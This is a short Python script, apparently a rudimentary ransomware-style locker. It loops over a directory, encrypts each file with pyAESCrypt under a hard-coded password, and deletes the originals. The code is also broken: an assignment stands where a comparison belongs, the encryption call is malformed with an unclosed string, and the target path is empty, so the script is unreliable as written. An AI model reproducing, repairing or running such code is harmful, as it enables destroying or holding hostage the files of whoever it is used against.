import os
import pyAESCrypt


path = ''
for filename in os.listdir(path):
    file_path = os.path.join(path,filename)
    print(file_path)
    if os.path.isfile(file_path):
        if file_path = '/main.py':
            continue
        else:
            pyAESCrypt.encryptFile(file_path.f'{file_path},aes,"root",64*1024)
            os.remove(file_path)
            print(f'{file_path} ENCRYPTED')


